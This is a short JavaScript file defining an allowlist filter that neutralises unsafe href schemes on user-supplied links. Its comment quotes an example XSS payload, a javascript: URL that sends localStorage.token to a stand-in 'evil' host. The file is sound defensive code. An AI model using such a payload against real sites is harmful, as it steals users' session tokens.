// Allowlist for href schemes on user-supplied URLs (attachment links, photo
// credit links, etc.). Without this filter, a teammate could save a value
// like `javascript:fetch('//evil/?'+localStorage.token)` and steal the JWT
// of anyone who clicks the link. React doesn't strip javascript: itself.
//
// Returns the original URL if its scheme is on the allowlist, otherwise '#'
// (a benign no-op anchor target).
const ALLOWED_SCHEMES = /^(https?:|mailto:|tel:)/i;

export function safeHref(url) {
  if (!url) return '#';
  const trimmed = String(url).trim();
  // Bare domains and relative paths are fine.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(trimmed)) return trimmed;
  return ALLOWED_SCHEMES.test(trimmed) ? trimmed : '#';
}
